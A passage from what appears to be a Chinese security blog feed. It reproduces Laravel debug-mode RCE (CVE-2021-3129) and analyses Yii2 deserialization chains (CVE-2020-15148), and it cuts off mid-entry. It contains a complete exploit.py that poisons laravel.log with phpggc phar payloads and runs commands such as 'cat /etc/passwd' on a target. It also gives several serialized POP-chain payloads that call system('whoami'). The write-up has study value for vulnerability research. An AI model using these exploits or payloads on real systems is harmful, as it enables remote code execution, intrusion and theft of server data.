href="#tips：">🍭</a>tips：</h6><p><code>utf-16le</code>是两个字节代表一个字符（le是指小端模式），<code>utf-8</code>是一个字节代表一个字符。利用这个特性，我们可以把一串<code>utf8</code>字符当作<code>utf16</code>，在这样转换时字符串就会变成非ascii的乱码。由于这些是非ascii字符，因此使用base64解码时会被清空。php过滤器中刚好存在这些过滤器，即<code>php://filter/read=convert.iconv.utf-16le.utf-8/resource=xxx.txt</code>，是指把xxx.txt的内容视作<code>utf16</code>，并将其转换成<code>utf8</code>。</p><p>我们可以先把POC base64编码（获取POC链时）</p><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w0</code></pre><p>然后进行utf-8转utf-16le。在读log文件时先进行utf-16le转utf-8，这样之前的字符都会变成乱码而POC不会，然后使用base64解码，就会去掉乱码，只剩下POC明文。<strong>但utf-16le编码会在utf-8的字符后加上一个<code>\00</code>空字节</strong>，在utf-8转utf-16le需要在每个字符<strong>后面</strong>加上一个<code>\00</code>字节。这里需要用到<code>convert.quoted-printable-encode</code>过滤器，它可以把所有的不可见字符转换成<code>=xx</code>，比如把<code>\00</code>转换成<code>=00</code>。</p><p>理一下思路：POC==&gt;BASE64==&gt;把<code>\00</code>转换成<code>=00</code>==&gt;utf-16le.utf-8</p><p>base64编码在生成POC链时就完成，后面两步写个php或者py进行编码</p><p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$filename = <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-encode|convert.iconv.utf-8.utf-16le/resource=1.txt&quot;</span>; <span class="hljs-comment">//1.txt是base64编码后的POC</span><span class="hljs-keyword">echo</span> $filename;<span class="hljs-meta">?&gt;</span></code></pre><p>PS：BASE64==&gt;把<code>\00</code>转换成<code>=00</code>==&gt;utf-16le.utf-8过程也可脚本实现</p><pre><code class="hljs coffeescript"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hexpayload = <span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-comment"># base64 payload</span>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:    i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;123456789012345&quot;</span>+armedPayload)<span class="hljs-comment">#前面加15个字符，对应坑点1</span></code></pre><p>编码之后：</p><p><img src="/2021/07/14/rce-0/16.jpg" alt="16"></p><p>读取时再逆向解码：<code>php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=xxxx/laravel.log</code>就可还原POC链。</p><h5 id="触发Phar反序列化"><a class="header-anchor" href="#触发Phar反序列化">🍭</a>触发Phar反序列化</h5><p><code>phar:///xxxx/laravel/storage/logs/laravel.log</code></p><p><img src="/2021/07/14/rce-0/17.jpg" alt="17"></p><h5 id="此方法的坑点："><a class="header-anchor" href="#此方法的坑点：">🍭</a>此方法的坑点：</h5><ol><li>前面提到<code>laravel.log</code>文件中有三处会显示payload，其中最后一处当payload过长时，从第十六个字符开始都会省略成<code>...</code>，因此我们要保证第十六个字符不在<code>=</code>的后两位，比如<code>=0.</code>、<code>=..</code>会导致<code>quoted-printable-decode</code>过滤器返回空结果。因此需要在payload前填充15个字符，让第三处不显示payload。</li><li>由于<code>convert.quoted-printable-decode</code>会对<code>=</code>当作特殊字符，因此base64结尾可能有的<code>=</code>会造成解析出错，因此需要手动把base64编码后的<code>=</code>替换成<code>=3D</code>，对于base64编码中的<code>+</code>最好也替换成<code>=2B</code>。</li><li>发送poc之后，使用过滤器来解析log时，如果laravel.log最终的字节数为奇数，那么在<code>utf-16le-&gt;utf-8</code>时又会抛出一条新日志，这样后续的base64  decode就会失败了。由于我们的poc会在log中出现两次，因此所有poc字符数必然是偶数个，影响log文件字符数奇偶的只能是log框架文本本身的字符数。只要在我们发送poc之前提前发送一个偶数文件名的请求，这样最终的log中就会有两次log框架本身的字符，因此必为偶数。</li></ol><h4 id="方式二"><a class="header-anchor" href="#方式二">🍭</a>方式二</h4><p>直接在下载的CVE中修改exploit.py中的url为自己的漏洞地址，把exp和phpggc放在同一目录，使用python3执行exp</p><p><img src="/2021/07/14/rce-0/13.jpg" alt="13"></p><p>PS：</p><blockquote><p>phpggc在github上有<br><code>git clone https://github.com/ambionics/phpggc.git</code>(需要给phpggc执行权限)<br>docker-compose用完记得关<br><img src="/2021/07/14/rce-0/14.jpg" alt="14"></p></blockquote><blockquote><p><a href="http://exploit.py">exploit.py</a></p><pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/python3</span>import requests as reqimport os, uuid<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span>:</span>    __gadget_chains = &#123;        <span class="hljs-string">&quot;monolog_rce1&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,        <span class="hljs-string">&quot;monolog_rce2&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,        <span class="hljs-string">&quot;monolog_rce3&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,    &#125;  <span class="hljs-comment"># phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力</span>    __delimiter_len = <span class="hljs-number">8</span>  <span class="hljs-comment"># 定界符长度</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__vul_check</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        resp = req.get(<span class="hljs-keyword">self</span>.__url, verify=False)        <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">405</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;laravel&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.<span class="hljs-symbol">text:</span>            <span class="hljs-keyword">return</span> False        <span class="hljs-keyword">return</span> True    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__payload_send</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, payload)</span></span><span class="hljs-symbol">:</span>        header = &#123;            <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>        &#125;        data = &#123;            <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,            <span class="hljs-string">&quot;parameters&quot;</span>: &#123;                <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;cve20213129&quot;</span>,                <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>            &#125;        &#125;        data[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = payload        resp = req.post(<span class="hljs-keyword">self</span>.__url, headers=header, json=data, verify=False)        <span class="hljs-comment"># print(resp.text)</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__command_handler</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, command)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><span class="hljs-string">        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。</span><span class="hljs-string">        &quot;</span><span class="hljs-string">&quot;&quot;</span>        <span class="hljs-keyword">self</span>.__delimiter = str(uuid.uuid1())[<span class="hljs-symbol">:self</span>.__delimiter_len]  <span class="hljs-comment"># 定界符用于定位页面中命令执行结果的位置。</span>        <span class="hljs-comment"># print(delimiter)</span>        command = <span class="hljs-string">&quot;echo %s &amp;&amp; %s &amp;&amp; echo %s&quot;</span> % (<span class="hljs-keyword">self</span>.__delimiter, command, <span class="hljs-keyword">self</span>.__delimiter)        <span class="hljs-comment"># print(command)</span>        escaped_chars = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>]  <span class="hljs-comment"># 我只想到这么多，可自行添加。</span>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-symbol">escaped_chars:</span>            command = command.replace(c, <span class="hljs-string">&#x27;\\&#x27;</span> + c)        <span class="hljs-comment"># print(command)</span>        <span class="hljs-keyword">return</span> command    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__clear_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(            <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__gen_payload</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, gadget_chain)</span></span><span class="hljs-symbol">:</span>        gen_shell = <span class="hljs-keyword">self</span>.__gadget_chains[gadget_chain] % (<span class="hljs-keyword">self</span>.__command)        <span class="hljs-comment"># print(gen_shell)</span>        os.system(gen_shell)        with open(<span class="hljs-string">&#x27;payload.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as <span class="hljs-symbol">f:</span>            payload = f.read().replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;a&#x27;</span>  <span class="hljs-comment"># 添加一个字符使得两个完整的payload总是只有一个可以正常解码</span>        os.system(<span class="hljs-string">&quot;rm payload.txt&quot;</span>)        <span class="hljs-comment"># print(payload)</span>        <span class="hljs-keyword">return</span> payload    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decode_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(            <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__unserialize_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__rce</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        text = <span class="hljs-keyword">self</span>.__unserialize_log().text        <span class="hljs-comment"># print(text)</span>        echo_find = text.find(<span class="hljs-keyword">self</span>.__delimiter)        <span class="hljs-comment"># print(echo_find)</span>        <span class="hljs-keyword">if</span> echo_find &gt;= <span class="hljs-number">0</span><span class="hljs-symbol">:</span>            <span class="hljs-keyword">return</span> text[echo_find + <span class="hljs-keyword">self</span>.__delimiter_len + <span class="hljs-number">1</span>: text.find(<span class="hljs-keyword">self</span>.__delimiter, echo_find + <span class="hljs-number">1</span>)]        <span class="hljs-symbol">else:</span>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[-] RCE echo is not found.&quot;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">for</span> gadget_chain <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.__gadget_chains.keys()<span class="hljs-symbol">:</span>            print(<span class="hljs-string">&quot;[*] Try to use %s for exploitation.&quot;</span> % (gadget_chain))            <span class="hljs-keyword">self</span>.__clear_log()            <span class="hljs-keyword">self</span>.__clear_log()            <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">2</span>)            <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-keyword">self</span>.__gen_payload(gadget_chain))            <span class="hljs-keyword">self</span>.__decode_log()            print(<span class="hljs-string">&quot;[*] Result:&quot;</span>)            print(<span class="hljs-keyword">self</span>.__rce())    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, target, command)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">self</span>.target = target        <span class="hljs-keyword">self</span>.__url = req.compat.urljoin(target, <span class="hljs-string">&quot;_ignition/execute-solution&quot;</span>)        <span class="hljs-keyword">self</span>.__command = <span class="hljs-keyword">self</span>.__command_handler(command)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">self</span>.__vul_check()<span class="hljs-symbol">:</span>            print(<span class="hljs-string">&quot;[-] [%s] is seems not vulnerable.&quot;</span> % (<span class="hljs-keyword">self</span>.target))            print(<span class="hljs-string">&quot;[*] You can also call obj.exp() to force an attack.&quot;</span>)        <span class="hljs-symbol">else:</span>            <span class="hljs-keyword">self</span>.exp()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    Exp(<span class="hljs-string">&quot;http://xxx:8888&quot;</span>, <span class="hljs-string">&quot;cat /etc/passwd&quot;</span>)<span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">&#x27;__main__&#x27;</span><span class="hljs-symbol">:</span>    main()</code></pre></blockquote><h2 id="后记"><a class="header-anchor" href="#后记">🍭</a>后记</h2><p>CVE-2021-3129分析复现太难了，坑点贼多，而且这个漏洞原作者都没声明，要疯狂找文章；不知道是不是好久没开kali（一个学期……💢💢💢），指令有点不熟悉，而且pip，docker-compose环境全乱了，搭环境就搭了好久，执行<code>docker-compose up -d</code>的时候一定要切到root权限，否则会疯狂报错💫💫💫，复现这个还得了解动态调试，phpstorm又不擅长，又跑去学……总之异常艰辛👻👻👻。</p><h4 id="参考："><a class="header-anchor" href="#参考：">🍭</a>参考：</h4><p><a href="https://xz.aliyun.com/t/9165?page=1#toc-3">Laravel Debug RCE分析</a></p><p><a href="https://anquan.baidu.com/article/1286">Laravel Debug模式下远程代码执行漏洞分析</a></p><p><a href="https://www.ambionics.io/blog/laravel-debug-rce">Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Yii2 反序列化（CVE-2020-15148）分析</title>
    <link href="/2021/07/12/filter/"/>
    <url>/2021/07/12/filter/</url>
    
    <content type="html"><![CDATA[<p>Yii是一套基于组件、用于开发大型 Web 应用的高性能 PHP 框架，Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize()时，攻击者可通过构造特定的恶意请求执行任意命令。</p><p>其应用结构如下：</p><img src="/2021/07/12/filter/1.jpg" alt="1" style="zoom: 50%;"><p>研究前先搭个框架，可以composer安装，不过特别慢。我是直接到github上下载的，需要修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值，任意值即可</p><p>搭完如下页面</p><p><img src="/2021/07/12/filter/4.jpg" alt="4"></p><h2 id="漏洞分析"><a class="header-anchor" href="#漏洞分析">🍭</a>漏洞分析</h2><p>先看github的commit记录</p><p><img src="/2021/07/12/filter/5.jpg" alt="5"></p><p>从BatchQueryResults.php出发开始挖链。</p><h3 id="POC1"><a class="header-anchor" href="#POC1">🍭</a>POC1</h3><p>起始点一般都是能够自动调用的函数中，也就是__destruct()方法：</p><p><img src="/2021/07/12/filter/2.jpg" alt="2"></p><p>调用reset()方法</p><p><img src="/2021/07/12/filter/3.jpg" alt="3"></p><p><code>$this-&gt;dataReader</code>可控，可以调用不存在close()方法并且存在__call()方法的类，就是找一个跳板。全局搜索<code>__call</code>,出现了很多结果，但是最好利用的一个是<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code>,它的<code>__call</code>方法：</p><p><img src="/2021/07/12/filter/6.jpg" alt="6"></p><p>跟进format</p><p><img src="/2021/07/12/filter/7.jpg" alt="7"></p><p><code>$formatter</code>与<code>$arguments</code>都不可控，再跟进getFormatter</p><p><img src="/2021/07/12/filter/8.jpg" alt="8"></p><p><code>$formatter</code>传入了<code>$this-&gt;getFormatter</code>,在这个方法中，<code>$this-&gt;formatters</code>可控，则<code>getFormatter</code>方法的返回值是可控的。也就是说call_user_func_array这个函数的第一个参数可控，第二个参数为空，这里可以执行<code>phpinfo</code>：</p><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;</span><span class="php"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;</span><span class="php">  <span class="hljs-keyword">private</span> $_dataReader;</span><span class="php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$_dataReader</span>) </span>&#123;</span><span class="php">   <span class="hljs-keyword">$this</span>-&gt;_dataReader = $_dataReader;</span><span class="php">  &#125;</span><span class="php"> &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;</span><span class="php"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;</span><span class="php">  <span class="hljs-keyword">protected</span> $formatters = <span class="hljs-keyword">array</span>();</span><span class="php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$formatters</span>) </span>&#123;</span><span class="php">   <span class="hljs-keyword">$this</span>-&gt;formatters = $formatters;</span><span class="php">  &#125;</span><span class="php"> &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> &#123;</span><span class="php"> $a = <span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;close&#x27;</span>=&gt;<span class="hljs-string">&#x27;phpinfo&#x27;</span>));</span><span class="php"> $b = <span class="hljs-keyword">new</span> yii\db\BatchQueryResult($a);</span><span class="php"> <span class="hljs-keyword">print</span>(urlencode(serialize($b)));</span><span class="php">&#125;</span></code></pre><p>接下来要寻找变量可控的rce点——&gt;找调用了call_user_func函数的无参方法,构造正则：<code>function \w+\(\) ?\n?\&#123;(.*\n)+call_user_func</code>或<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>进行搜索找到两个容易利用的</p><ul><li><code>rest/CreateAction.php</code></li><li><code>rest/IndexAction.php</code></li></ul><h5 id="IndexAction-php"><a class="header-anchor" href="#IndexAction-php">🍭</a>IndexAction.php</h5><p><img src="/2021/07/12/filter/9.jpg" alt="9"></p><p><code>$this-&gt;checkAccess</code>以及<code>$this-&gt;id</code>都可控</p><p>思路：<code>__destruct</code>-&gt;<code>reset()</code>-&gt;<code>__call</code>-&gt;<code>call_user_func_array()</code>-&gt;<code>call_user_func</code>-&gt; <code>yii\rest\IndexAction::run()</code>利用了魔术方法<code>__call</code>，调用对象中不存在的方法，触发此魔术方法</p><p>payload:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;        <span class="hljs-keyword">public</span> $id;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;        <span class="hljs-keyword">protected</span> $formatters;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> CreateAction(), <span class="hljs-string">&#x27;run&#x27;</span>];        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;        <span class="hljs-keyword">private</span> $_dataReader;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>));&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload仅仅是一个反序列化利用链，还需要一个反序列化的入口点，这个需要我们自己构造:</p><p>在controllers目录下创建一个Controller:</p><p><img src="/2021/07/12/filter/10.jpg" alt="10"></p><p>访问</p><img src="/2021/07/12/filter/11.jpg" alt="11" style="zoom:50%;"><h3 id="POC2"><a class="header-anchor" href="#POC2">🍭</a>POC2</h3><p>起点和链一相同，是<code>BatchQueryResult</code>类的<code>__destruct</code>，然后是<code>$this-&gt;_dataReader-&gt;close()</code>，但是这里不找<code>__call</code>，我们顺着方向去找存在<code>close</code>方法的类，且在此类中的close方法调用了存在危险函数的方法。</p><p><img src="/2021/07/12/filter/12.jpg" alt="12"></p><p>跟进<code>$this-&gt;composeFields()</code>，Dbsession类继承自MultiFieldSession类</p><p><img src="/2021/07/12/filter/13.jpg" alt="13"></p><p>在上述<code>close()</code>方法中调用了父类中的<code>$this-&gt;composeFields()</code>方法。跟进父类文中的对应方法代码块：</p><p><img src="/2021/07/12/filter/14.jpg" alt="14"></p><p><code>call_user_func</code>函数的官方定义中$callback参数支持已实例化的对象作为数组传递</p><pre><code class="hljs reasonml">call<span class="hljs-constructor">_user_func(<span class="hljs-params">callable</span> $<span class="hljs-params">callback</span>, <span class="hljs-params">mixed</span> $<span class="hljs-params">parameter</span> = ?, <span class="hljs-params">mixed</span> $<span class="hljs-operator">...</span> = ?)</span>: mixed</code></pre><p><img src="/2021/07/12/filter/15.jpg" alt="15"></p><p>故可再续上链一的无参的方法（<code>yii\rest\IndexAction::run()</code>）</p><p>payload</p><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> $checkAccess;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexAction</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span><span class="php">        &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;checkAccess = $func;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;id = $param;</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;</span><span class="php">    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiFieldSession</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> $writeCallback;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiFieldSession</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span><span class="php">        &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [<span class="hljs-keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="hljs-string">&quot;run&quot;</span>];</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;</span><span class="php">    <span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">base</span>\<span class="hljs-title">BaseObject</span>;</span><span class="php">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span></span><span class="php">    &#123;</span><span class="php">        <span class="hljs-keyword">private</span> $_dataReader;</span><span class="php">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$func, $param</span>)</span></span><span class="php">        &#123;</span><span class="php">            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> \yii\web\DbSession($func, $param);</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> &#123;</span><span class="php">    $exp = <span class="hljs-keyword">new</span> \yii\db\BatchQueryResult(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>);</span><span class="php">    <span class="hljs-keyword">echo</span>(base64_encode(serialize($exp)));</span><span class="php">&#125;</span></code></pre><h3 id="POC3"><a class="header-anchor" href="#POC3">🍭</a>POC3</h3><p>以上链基于基础的yii2，新版的<code>BatchQueryResult</code>类已经被修复无法反序列化，我们可以找其他类。全局搜索<code>__destruct</code>与<code>__wakeup</code>函数，然后进行排查。</p><p><img src="/2021/07/12/filter/16.jpg" alt="16"></p><p><code>$this-&gt;processes</code>可控==&gt;<code>$process</code>可控，然后下面又调用了<code>$process-&gt;isRunning</code>,又可以接上第一条利用链的<code>__call</code>方法开头的后半段。思路：<code>Codeception\Extension\RunProcess::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><p>payload</p><pre><code class="hljs 